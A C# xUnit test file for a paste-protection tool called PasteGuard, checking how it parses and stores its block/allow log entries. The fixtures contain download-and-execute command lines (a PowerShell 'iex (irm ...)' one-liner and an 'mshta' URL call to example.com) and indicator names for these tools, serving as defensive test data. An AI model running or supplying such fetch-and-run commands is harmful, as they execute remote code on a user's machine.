using PasteGuard;
using Xunit;

namespace PasteGuard.Tests;

public class LogEntryTests
{
    [Fact]
    public void Parses_a_blocked_line()
    {
        var line = "2026-11-03 22:19:53  BLOCKED          score=92 threshold=70 indicators=powershell,iex text=\"powershell -c \"iex (irm https://example.com/a)\"\"";
        Assert.True(LogEntry.TryParse(line, out var e));
        Assert.Equal(new DateTime(2026, 11, 3, 22, 19, 53), e.Time);
        Assert.Equal("BLOCKED", e.Kind);
        Assert.True(e.IsThreat);
        Assert.Equal(92, e.Score);
        Assert.Equal("powershell -c \"iex (irm https://example.com/a)\"", e.Text);
        Assert.Equal("Blocked", e.Action);
    }

    [Fact]
    public void Parses_lines_without_score_or_text()
    {
        Assert.True(LogEntry.TryParse("2026-11-03 22:20:51  START            version=1.0.0 threshold=70 enabled=True", out var e));
        Assert.Equal("START", e.Kind);
        Assert.False(e.IsThreat);
        Assert.Null(e.Score);
        Assert.Null(e.Text);

        Assert.True(LogEntry.TryParse("2026-11-03 22:21:00  STOP             ", out var stop));
        Assert.Equal("STOP", stop.Kind);
    }

    [Theory]
    [InlineData("")]
    [InlineData("garbage")]
    [InlineData("2026-13-45 99:99:99  BLOCKED x")]
    public void Rejects_bad_lines(string line) => Assert.False(LogEntry.TryParse(line, out _));

    [Fact]
    public void Round_trips_through_the_log_file()
    {
        var dir = Path.Combine(Path.GetTempPath(), "cfb-log-" + Guid.NewGuid().ToString("N"));
        Log.PathOnDisk = Path.Combine(dir, "events.log");
        try
        {
            Log.Write("BLOCKED", "score=88 threshold=70 indicators=mshta text=\"mshta https://example.com/x\"");
            Log.Write("RELEASED", "score=88 text=\"mshta https://example.com/x\"");
            Log.Write("ALLOWED", "score=5 threshold=70 indicators=cmd");

            var entries = Log.ReadEntries();
            Assert.Equal(3, entries.Count);
            Assert.Equal(2, entries.Count(e => e.IsThreat));
            Assert.Equal("mshta https://example.com/x", entries[0].Text);

            Log.Clear();
            Assert.Empty(Log.ReadEntries());
        }
        finally
        {
            try { Directory.Delete(dir, true); } catch { }
        }
    }
}
